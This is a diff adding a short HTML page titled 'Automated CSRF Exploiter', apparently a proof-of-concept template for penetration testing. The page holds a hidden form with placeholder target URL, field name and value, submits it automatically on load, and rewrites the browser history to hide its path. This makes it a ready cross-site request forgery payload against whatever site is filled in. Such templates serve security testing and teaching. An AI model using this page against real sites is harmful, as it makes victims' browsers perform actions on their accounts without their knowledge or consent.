@@ -1,0 +1,13 @@
+<html>
+    <h1>Automated CSRF Exploiter</h1>
+    <h2>Use DevTool to see requests and responses </h2> 
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="URL" method="POST">
+      <input type="hidden" name="INPUT-NAME" value="VALUE" />
+    </form>
+  </body>
+</html>
+<script>
+      document.forms[0].submit();
+</script>
